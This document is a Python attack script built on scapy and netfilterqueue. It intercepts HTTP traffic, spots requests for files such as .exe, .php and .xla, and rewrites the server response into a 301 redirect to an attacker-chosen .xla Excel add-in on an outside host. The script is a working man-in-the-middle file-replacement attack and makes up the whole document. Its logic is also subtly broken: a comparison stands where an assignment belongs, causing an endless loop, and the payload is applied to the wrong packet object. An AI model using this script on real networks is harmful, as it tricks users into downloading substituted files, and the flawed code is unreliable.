#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import time
stuff = True
ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
          
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def modify_packet(packet, load):
    modified_packet = set_load(packet, load)
                
    packet.set_payload(str(modified_packet))
    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            extensions = [".php", ".exe", ".txt", ".xlsx", ".xls", ".xla"]
            for extension in extensions:
                if extension in load:
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                        
                    print("[!] >>> " + extension[1:] + " file requested!")

        
            
        
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://www.emnrd.state.nm.us/ocd/c115_000.xla\n\n'
               
        if load != scapy_packet[scapy.Raw].load:
            
            print("hello")
            
            while stuff == True:
                modify_packet(scapy_packet, load)

                stuff == False
                

   
    packet.accept()
    


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()